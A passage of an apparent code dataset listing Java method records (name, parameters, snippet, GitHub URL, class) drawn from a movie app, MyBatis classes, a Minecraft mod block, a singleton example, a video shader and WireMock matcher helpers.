"setShowCasting", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setShowCasting(boolean b) {        mShowCasting = b;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/activities/base/ButterBaseActivity.java", "stars": "4", "class": {"name": "ButterBaseActivity", "extends": "TorrentBaseActivity", "implements": ["BeamManager", "VPNManager"], "modifiers": ["public"]}}, {"method_name": "onVPNServiceReady", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onVPNServiceReady() {    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/activities/base/ButterBaseActivity.java", "stars": "4", "class": {"name": "ButterBaseActivity", "extends": "TorrentBaseActivity", "implements": ["BeamManager", "VPNManager"], "modifiers": ["public"]}}, {"method_name": "onVPNStatusUpdate", "params": ["VPNManager", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onVPNStatusUpdate(VPNManager.State state, String message) {    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/activities/base/ButterBaseActivity.java", "stars": "4", "class": {"name": "ButterBaseActivity", "extends": "TorrentBaseActivity", "implements": ["BeamManager", "VPNManager"], "modifiers": ["public"]}}, {"method_name": "getAddress", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getAddress() {        return address;    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/custom_collection_handling/Contact.java", "stars": "15", "class": {"name": "Contact", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setAddress", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setAddress(String address) {        this.address = address;    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/custom_collection_handling/Contact.java", "stars": "15", "class": {"name": "Contact", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getId", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getId() {        return id;    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/custom_collection_handling/Contact.java", "stars": "15", "class": {"name": "Contact", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setId", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setId(Integer id) {        this.id = id;    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/custom_collection_handling/Contact.java", "stars": "15", "class": {"name": "Contact", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getPhone", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getPhone() {        return phone;    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/custom_collection_handling/Contact.java", "stars": "15", "class": {"name": "Contact", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setPhone", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setPhone(String phone) {        this.phone = phone;    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/custom_collection_handling/Contact.java", "stars": "15", "class": {"name": "Contact", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "initElements", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void initElements() {\t\telements.blocks.add(() -> new CustomBlock());\t\telements.items.add(() -> new BlockItem(block, new Item.Properties().group(null)).setRegistryName(block.getRegistryName()));\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedOrangeAmaranthBlock.java", "stars": "2", "class": {"name": "PottedOrangeAmaranthBlock", "extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"method_name": "clientLoad", "params": ["FMLClientSetupEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void clientLoad(FMLClientSetupEvent event) {\t\tRenderTypeLookup.setRenderLayer(block, RenderType.getCutout());\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedOrangeAmaranthBlock.java", "stars": "2", "class": {"name": "PottedOrangeAmaranthBlock", "extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"method_name": "isNormalCube", "params": ["BlockState", "IBlockReader", "BlockPos"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\t\tpublic boolean isNormalCube(BlockState state, IBlockReader worldIn, BlockPos pos) {\t\t\treturn false;\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedOrangeAmaranthBlock.java", "stars": "2", "class": {"name": "CustomBlock", "extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "propagatesSkylightDown", "params": ["BlockState", "IBlockReader", "BlockPos"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\t\tpublic boolean propagatesSkylightDown(BlockState state, IBlockReader reader, BlockPos pos) {\t\t\treturn true;\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedOrangeAmaranthBlock.java", "stars": "2", "class": {"name": "CustomBlock", "extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getShape", "params": ["BlockState", "IBlockReader", "BlockPos", "ISelectionContext"], "throws": null, "modifiers": ["public"], "return_type": "VoxelShape", "snippet": "\t\tpublic VoxelShape getShape(BlockState state, IBlockReader world, BlockPos pos, ISelectionContext context) {\t\t\treturn VoxelShapes.create(0.312D, 0D, 0.312D, 0.688D, 0.375D, 0.688D);\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedOrangeAmaranthBlock.java", "stars": "2", "class": {"name": "CustomBlock", "extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "tickRate", "params": ["IWorldReader"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\t\tpublic int tickRate(IWorldReader world) {\t\t\treturn 0;\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedOrangeAmaranthBlock.java", "stars": "2", "class": {"name": "CustomBlock", "extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getPickBlock", "params": ["BlockState", "RayTraceResult", "IBlockReader", "BlockPos", "PlayerEntity"], "throws": null, "modifiers": ["public"], "return_type": "ItemStack", "snippet": "\t\tpublic ItemStack getPickBlock(BlockState state, RayTraceResult target, IBlockReader world, BlockPos pos, PlayerEntity player) {\t\t\treturn new ItemStack(OrangeAmaranthBlock.block, (int) (1));\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedOrangeAmaranthBlock.java", "stars": "2", "class": {"name": "CustomBlock", "extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getMaterialColor", "params": ["BlockState", "IBlockReader", "BlockPos"], "throws": null, "modifiers": ["public"], "return_type": "MaterialColor", "snippet": "\t\tpublic MaterialColor getMaterialColor(BlockState state, IBlockReader blockAccess, BlockPos pos) {\t\t\treturn MaterialColor.STONE;\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedOrangeAmaranthBlock.java", "stars": "2", "class": {"name": "CustomBlock", "extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getPushReaction", "params": ["BlockState"], "throws": null, "modifiers": ["public"], "return_type": "PushReaction", "snippet": "\t\tpublic PushReaction getPushReaction(BlockState state) {\t\t\treturn PushReaction.DESTROY;\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedOrangeAmaranthBlock.java", "stars": "2", "class": {"name": "CustomBlock", "extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getDrops", "params": ["BlockState", "LootContext"], "throws": null, "modifiers": ["public"], "return_type": "List<ItemStack>", "snippet": "\t\tpublic List<ItemStack> getDrops(BlockState state, LootContext.Builder builder) {\t\t\tList<ItemStack> dropsOriginal = super.getDrops(state, builder);\t\t\tif (!dropsOriginal.isEmpty())\t\t\t\treturn dropsOriginal;\t\t\treturn Collections.singletonList(new ItemStack(Blocks.FLOWER_POT, (int) (1)));\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedOrangeAmaranthBlock.java", "stars": "2", "class": {"name": "CustomBlock", "extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "removedByPlayer", "params": ["BlockState", "World", "BlockPos", "PlayerEntity", "boolean", "IFluidState"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\t\tpublic boolean removedByPlayer(BlockState state, World world, BlockPos pos, PlayerEntity entity, boolean willHarvest, IFluidState fluid) {\t\t\tboolean retval = super.removedByPlayer(state, world, pos, entity, willHarvest, fluid);\t\t\tint x = pos.getX();\t\t\tint y = pos.getY();\t\t\tint z = pos.getZ();\t\t\t{\t\t\t\tjava.util.HashMap<String, Object> $_dependencies = new java.util.HashMap<>();\t\t\t\t$_dependencies.put(\"x\", x);\t\t\t\t$_dependencies.put(\"y\", y);\t\t\t\t$_dependencies.put(\"z\", z);\t\t\t\t$_dependencies.put(\"world\", world);\t\t\t\tOrangeAmaranthPlayerProcedure.executeProcedure($_dependencies);\t\t\t}\t\t\treturn retval;\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedOrangeAmaranthBlock.java", "stars": "2", "class": {"name": "CustomBlock", "extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "onExplosionDestroy", "params": ["World", "BlockPos", "Explosion"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void onExplosionDestroy(World world, BlockPos pos, Explosion e) {\t\t\tsuper.onExplosionDestroy(world, pos, e);\t\t\tint x = pos.getX();\t\t\tint y = pos.getY();\t\t\tint z = pos.getZ();\t\t\t{\t\t\t\tjava.util.HashMap<String, Object> $_dependencies = new java.util.HashMap<>();\t\t\t\t$_dependencies.put(\"x\", x);\t\t\t\t$_dependencies.put(\"y\", y);\t\t\t\t$_dependencies.put(\"z\", z);\t\t\t\t$_dependencies.put(\"world\", world);\t\t\t\tOrangeAmaranthExplosionProcedure.executeProcedure($_dependencies);\t\t\t}\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedOrangeAmaranthBlock.java", "stars": "2", "class": {"name": "CustomBlock", "extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "onBlockActivated", "params": ["BlockState", "World", "BlockPos", "PlayerEntity", "Hand", "BlockRayTraceResult"], "throws": null, "modifiers": ["public"], "return_type": "ActionResultType", "snippet": "\t\tpublic ActionResultType onBlockActivated(BlockState state, World world, BlockPos pos, PlayerEntity entity, Hand hand,\t\t\t\tBlockRayTraceResult hit) {\t\t\tsuper.onBlockActivated(state, world, pos, entity, hand, hit);\t\t\tint x = pos.getX();\t\t\tint y = pos.getY();\t\t\tint z = pos.getZ();\t\t\tDirection direction = hit.getFace();\t\t\t{\t\t\t\tjava.util.HashMap<String, Object> $_dependencies = new java.util.HashMap<>();\t\t\t\t$_dependencies.put(\"entity\", entity);\t\t\t\t$_dependencies.put(\"x\", x);\t\t\t\t$_dependencies.put(\"y\", y);\t\t\t\t$_dependencies.put(\"z\", z);\t\t\t\t$_dependencies.put(\"world\", world);\t\t\t\tRightClickedOrangeAmaranthProcedure.executeProcedure($_dependencies);\t\t\t}\t\t\treturn ActionResultType.SUCCESS;\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedOrangeAmaranthBlock.java", "stars": "2", "class": {"name": "CustomBlock", "extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getSql", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getSql() {    return sql;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/BoundSql.java", "stars": "15", "class": {"name": "BoundSql", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getParameterMappings", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<ParameterMapping>", "snippet": "  public List<ParameterMapping> getParameterMappings() {    return parameterMappings;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/BoundSql.java", "stars": "15", "class": {"name": "BoundSql", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getParameterObject", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "  public Object getParameterObject() {    return parameterObject;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/BoundSql.java", "stars": "15", "class": {"name": "BoundSql", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "hasAdditionalParameter", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean hasAdditionalParameter(String name) {    String paramName = new PropertyTokenizer(name).getName();    return additionalParameters.containsKey(paramName);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/BoundSql.java", "stars": "15", "class": {"name": "BoundSql", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setAdditionalParameter", "params": ["String", "Object"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setAdditionalParameter(String name, Object value) {    metaParameters.setValue(name, value);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/BoundSql.java", "stars": "15", "class": {"name": "BoundSql", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getAdditionalParameter", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "  public Object getAdditionalParameter(String name) {    return metaParameters.getValue(name);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/BoundSql.java", "stars": "15", "class": {"name": "BoundSql", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "main", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {        System.out.println(\"\u61d2\u6c49\u5f0f1\uff0c\u7ebf\u7a0b\u4e0d\u5b89\u5168\");        Singleton instance1 = Singleton.getInstance();        Singleton instance2 = Singleton.getInstance();        System.out.println(instance1 == instance2);        System.out.println(\"instance1 \u7684 hashCode \u503c\u4e3a\uff1a\" + instance1.hashCode());        System.out.println(\"instance2 \u7684 hashCode \u503c\u4e3a\uff1a\" + instance2.hashCode());    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/creational/singleton/type3/SingletonTest03.java", "stars": "2", "class": {"name": "SingletonTest03", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getInstance", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "Singleton", "snippet": "    public static Singleton getInstance(){        if(instance == null){            instance = new Singleton();        }        return instance;    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/creational/singleton/type3/SingletonTest03.java", "stars": "2", "class": {"name": "Singleton", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "getShader", "params": ["GLSurfaceView"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getShader(GLSurfaceView mGlSurfaceView) {        String shader = \"#extension GL_OES_EGL_image_external : require\\n\"                + \"precision mediump float;\\n\"                + \"varying vec2 vTextureCoord;\\n\"                + \"uniform samplerExternalOES sTexture;\\n\" + \"void main() {\\n\"                + \"  vec4 color = texture2D(sTexture, vTextureCoord);\\n\"                + \"  float colorR = (color.r + color.g + color.b) / 3.0;\\n\"                + \"  float colorG = (color.r + color.g + color.b) / 3.0;\\n\"                + \"  float colorB = (color.r + color.g + color.b) / 3.0;\\n\"                + \"  gl_FragColor = vec4(colorR, colorG, colorB, color.a);\\n\"                + \"}\\n\";        return shader;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/effect/BlackAndWhiteEffect.java", "stars": "2", "class": {"name": "BlackAndWhiteEffect", "extends": null, "implements": ["ShaderInterface"], "modifiers": ["public"]}}, {"method_name": "equalTo", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "StringValuePattern", "snippet": "  public static StringValuePattern equalTo(String value) {    return WireMock.equalTo(value);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "binaryEqualTo", "params": ["byte"], "throws": null, "modifiers": ["public", "static"], "return_type": "BinaryEqualToPattern", "snippet": "  public static BinaryEqualToPattern binaryEqualTo(byte[] content) {    return WireMock.binaryEqualTo(content);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "binaryEqualTo", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "BinaryEqualToPattern", "snippet": "  public static BinaryEqualToPattern binaryEqualTo(String content) {    return WireMock.binaryEqualTo(content);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "equalToIgnoreCase", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "StringValuePattern", "snippet": "  public static StringValuePattern equalToIgnoreCase(String value) {    return WireMock.equalToIgnoreCase(value);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "equalToJson", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "StringValuePattern", "snippet": "  public static StringValuePattern equalToJson(String value) {    return WireMock.equalToJson(value);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "equalToJson", "params": ["String", "boolean", "boolean"], "throws": null, "modifiers": ["public", "static"], "return_type": "StringValuePattern", "snippet": "  public static StringValuePattern equalToJson(String value, boolean ignoreArrayOrder, boolean ignoreExtraElements) {    return WireMock.equalToJson(value, ignoreArrayOrder, ignoreExtraElements);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "matchingJsonPath", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "StringValuePattern", "snippet": "  public static StringValuePattern matchingJsonPath(String value) {    return WireMock.matchingJsonPath(value);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "matchingJsonPath", "params": ["String", "StringValuePattern"], "throws": null, "modifiers": ["public", "static"], "return_type": "StringValuePattern", "snippet": "  public static StringValuePattern matchingJsonPath(String value, StringValuePattern valuePattern) {    return WireMock.matchingJsonPath(value, valuePattern);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "equalToXml", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "StringValuePattern", "snippet": "  public static StringValuePattern equalToXml(String value) {    return WireMock.equalToXml(value);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "matchingXPath", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "MatchesXPathPattern", "snippet": "  public static MatchesXPathPattern matchingXPath(String value) {    return WireMock.matchingXPath(value);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "matchingXPath", "params": ["String", "Map<String,String>"], "throws": null, "modifiers": ["public", "static"], "return_type": "StringValuePattern", "snippet": "  public static StringValuePattern matchingXPath(String value, Map<String, String> namespaces) {    return WireMock.matchingXPath(value, namespaces);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "matchingXPath", "params": ["String", "StringValuePattern"], "throws": null, "modifiers": ["public", "static"], "return_type": "StringValuePattern", "snippet": "  public static StringValuePattern matchingXPath(String value, StringValuePattern valuePattern) {    return new MatchesXPathPattern(value, valuePattern);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "containing", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "StringValuePattern", "snippet": "  public static StringValuePattern containing(String value) {    return WireMock.containing(value);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "matching", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "StringValuePattern", "snippet": "  public static StringValuePattern matching(String regex) {    return WireMock.matching(regex);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "notMatching", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "StringValuePattern", "snippet": "  public static StringValuePattern notMatching(String regex) {    return WireMock.notMatching(regex);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "absent", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "StringValuePattern", "snippet": "  public static StringValuePattern absent() {    return WireMock.absent();  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "urlEqualTo", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "UrlPattern", "snippet": "  public static UrlPattern urlEqualTo(String testUrl) {    return WireMock.urlEqualTo(testUrl);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "urlMatching", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "UrlPattern", "snippet": "  public static UrlPattern urlMatching(String urlRegex) {    return WireMock.urlMatching(urlRegex);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "urlPathEqualTo", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "UrlPathPattern", "snippet": "  public static UrlPathPattern urlPathEqualTo(String testUrl) {    return WireMock.urlPathEqualTo(testUrl);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "urlPathMatching", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "UrlPathPattern", "snippet": "  public static UrlPathPattern urlPathMatching(String urlRegex) {    return WireMock.urlPathMatching(urlRegex);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "anyUrl", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "UrlPattern", "snippet": "  public static UrlPattern anyUrl() {    return WireMock.anyUrl();  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "lessThan", "params": ["int"], "throws": null, "modifiers": ["public", "static"], "return_type": "CountMatchingStrategy", "snippet": "  public static CountMatchingStrategy lessThan(int expected) {    return WireMock.lessThan(expected);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "lessThanOrExactly", "params": ["int"], "throws": null, "modifiers": ["public", "static"], "return_type": "CountMatchingStrategy", "snippet": "  public static CountMatchingStrategy lessThanOrExactly(int expected) {    return WireMock.lessThanOrExactly(expected);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "exactly", "params": ["int"], "throws": null, "modifiers": ["public", "static"], "return_type": "CountMatchingStrategy", "snippet": "  public static CountMatchingStrategy exactly(int expected) {    return WireMock.exactly(expected);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "moreThanOrExactly", "params": ["int"], "throws": null, "modifiers": ["public", "static"], "return_type": "CountMatchingStrategy", "snippet": "  public static CountMatchingStrategy moreThanOrExactly(int expected) {    return WireMock.moreThanOrExactly(expected);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "moreThan", "params": ["int"], "throws": null, "modifiers": ["public", "static"], "return_type": "CountMatchingStrategy", "snippet": "  public static CountMatchingStrategy moreThan(int expected) {    return WireMock.moreThan(expected);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "get", "params": ["UrlPattern"], "throws": null, "modifiers": 